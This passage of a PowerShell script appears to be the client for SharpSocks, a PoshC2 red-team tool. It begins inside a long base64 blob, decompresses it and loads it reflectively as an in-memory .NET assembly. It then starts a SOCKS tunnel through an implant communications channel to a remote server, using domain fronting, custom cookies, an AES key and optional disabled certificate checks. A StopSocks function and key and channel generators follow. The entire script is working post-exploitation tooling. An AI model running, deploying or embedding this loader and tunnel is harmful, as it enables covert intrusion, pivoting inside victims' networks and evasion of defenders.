J3yrPWvK0COfpvygAFoBM5IVHt6QICXCeBBhgrCMfCS2iVSqh6HYRmQCouXkjUel8TI6SefiRVDJFIXiagKsMb6Nav5M3YpAXDidvMlxhuKxxGfaCohCVppDZ6HYt4fIxbwfxaexRuffNxemFi/NXm7tQR6t4tdeicpLL7bREqrV/TIgktKvYZwm/+X5r8N1aEBzrK54Q+OC201foKxQLRSHKlthfuHhutPk271HzkuSp90uF49S6t7uZZU4Bw4tOPuoEzZyAyrpW7IA7cfdx+i38gsAc5Xz7M933hLg0Mjjy/cxns+LPnoEvv/r8mx9ftq+h4sDJEHsal8LF+Zkw2lq4FI7Mv1P7YHqxkn/tcu3CtZnesPWY4RM75sLYltZwfubd8FJlrjK9VHmyZGFhdkY8e9eDVnA/wkH7YukH8djkwPzi4NzcMN6T46OiKhV+axHX4yOEIwNh8gROB8R3O55f/69Ln3OcFaK+PR3jqq9NOq4LdE88pPEYE4hLiRLBcTEiJglid8KI2WkwyRO+5wV/iE2s23/8FeGxYr9nDB44c3IblYNcZpwn7M6b6eQyL7bPc/5hrjXaXGGb40VSPV2nrzv2XQkcI2bhCdN8T2L6mMv0Nf9KYgZ9IPYzhdGko169WzKYD8XyFrj96/S001wuuk6LHXzGrW5vkKeG32Y6FrbQ2W7HmGA+uLH64zx1vRSrF21pKPItxJDYS+XLzWWkqzyh2aKqXTtbtxwUxKxeZiVe+3z2boV6DFgGeKr0utnzUsUCbJu0QKzRHYhjRFdR4LO2L3E/tfBobmER4grT8l6zR8FJ0P+6wXfZ0B89/9X/9ByvMA/0xgvsDMSEbpxP/9T3Je77rfW2c2B7/58XO6nOWV6+xvNhiQQT6O3qFXkDSpH/sN2kjyh9lXvsKV0/CP42+9HTT6+J59eze/0NNXWolwDIAAA="
            [System.IO.MemoryStream] $output = New-Object System.IO.MemoryStream(45000)
            [System.IO.MemoryStream] $gzdll = New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String($PS))
            $gzipStream = New-Object System.IO.Compression.GzipStream $gzdll, ([IO.Compression.CompressionMode]::Decompress)
            try {
                $buffer = New-Object byte[](32000);
                while ($true)
                {
                    $read = $gzipStream.Read($buffer, 0, 32000)
                    if ($read -le 0)
                    {
                        break;
                    }
                    $output.Write($buffer, 0, $read)
                }
            }
            finally
            {
                Write-Verbose "Closing streams and newly decompressed file"
                $gzipStream.Close();
                $output.Close();
                $gzdll.Close();
            }
            $assembly = [System.Reflection.Assembly]::Load($output.ToArray())
            echo "[+] Client Assembly Loaded"
        }

        if($Insecure.IsPresent) {
            $InsecureSSL=$true
        } else {
            $InsecureSSL=$false
        }

        if (([System.Net.ServicePointManager]::ServerCertificateValidationCallback) -and ($InsecureSSL)) {
            $InsecureSSL=$false
        }

        if (!$Key) {
        $Key = Create-AesKey
        }

        $secureStringPwd = $Key | ConvertTo-SecureString -AsPlainText -Force

        #If there is no channel set
        if (!$Channel) {
        $Channel = Get-RandomChamnnel -Length 25
        }

        # Proxy Config
        if ($ProxyURL) {
            $Proxy = New-Object System.Net.WebProxy($ProxyURL,$True);

            if ($ProxyUser -and $ProxyPassword) {
                $creds = new-object System.Net.NetworkCredential
                $creds.UserName = $ProxyUser
                $creds.Domain = $ProxyDomain
                $creds.SecurePassword = ConvertTo-SecureString $ProxyPassword -AsPlainText -Force;
                $Proxy.Credentials = $Creds;
            } else {
                $Proxy.UseDefaultCredentials = $True;
            }
        } else {
            $Proxy = [System.Net.WebRequest]::GetSystemWebProxy()
            $Proxy.Credentials = [System.Net.CredentialCache]::DefaultCredentials
        }

        # New Uri
        $Uri = [System.Uri]$Uri

        # Add URLs
        $NewURLs = New-Object "System.Collections.Generic.List[String]"
        foreach ($URL in $URLs) {
        $NewURLs.Add($URL)
        }

        if ($Client.IsPresent){
            $Script:Comms = New-Object SocksProxy.Classes.Integration.PoshDefaultImplantComms
            $Script:Socks = [SocksProxy.Classes.Integration.PoshCreateProxy]::CreateSocksController($Uri, $Channel, $DomainFrontURL, $UserAgent, $secureStringPwd, $NewURLs, $Cookie1, $Cookie2, $Proxy, $Beacon, $Comms, $InsecureSSL);
            $Script:BoolStart = $Socks.Start()
            if ($BoolStart) {
                echo ""
                echo "[+] SharpSocks client Started!"
                echo ""
                echo "URLs:"
                foreach ($URL in $URLs) {
                echo "$($Uri)$($URL)"
                }
                echo "Channel: $Channel"
                echo "Key being used: $Key"
                echo "Beacon: $Beacon"
                echo "Cookies: $Cookie1 $Cookie2"
                echo "User-Agent: $UserAgent"
                echo ""
                echo ""
                echo "[-] Run StopSocks to stop the client!"
                echo ""
            }
        }
    }

}

function StopSocks {
    if ($BoolStart) {
        $Socks.Stop()
        $Socks.HARDStop()
        $Script:Socks.Stop()
        $Script:Socks.HARDStop()
        $Script:BoolStart = $Socks.Stop()
        $Script:BoolStart = $Socks.HARDStop()
        echo ""
        echo "[-] SharpSocks stopped!"
        echo ""
    } else {
        echo ""
        echo "[-] SharpSocks not running!"
        echo ""
    }
}

# creates a randon AES symetric encryption key
function Create-AesManagedObject
{
    param
    (
        [Object]
        $key,
        [Object]
        $IV
    )

    $aesManaged = New-Object -TypeName 'System.Security.Cryptography.RijndaelManaged'
    $aesManaged.Mode = [System.Security.Cryptography.CipherMode]::CBC
    $aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::Zeros
    $aesManaged.BlockSize = 128
    $aesManaged.KeySize = 256
    if ($IV)
    {
        if ($IV.getType().Name -eq 'String')
        {$aesManaged.IV = [System.Convert]::FromBase64String($IV)}
        else
        {$aesManaged.IV = $IV}
    }
    if ($key)
    {
        if ($key.getType().Name -eq 'String')
        {$aesManaged.Key = [System.Convert]::FromBase64String($key)}
        else
        {$aesManaged.Key = $key}
    }
    $aesManaged
}

# creates a randon AES symetric encryption key
function Create-AesKey()
{
    $aesManaged = Create-AesManagedObject
    $aesManaged.GenerateKey()
    [System.Convert]::ToBase64String($aesManaged.Key)
}

function Get-RandomChamnnel
{
    param ([int]$Length)
    $set    = 'abcdefghijklmnopqrstuvwxyz0123456789'.ToCharArray()
    $result = ''
    for ($x = 0; $x -lt $Length; $x++)
    {
        $result += $set | Get-Random
    }
    return $result
}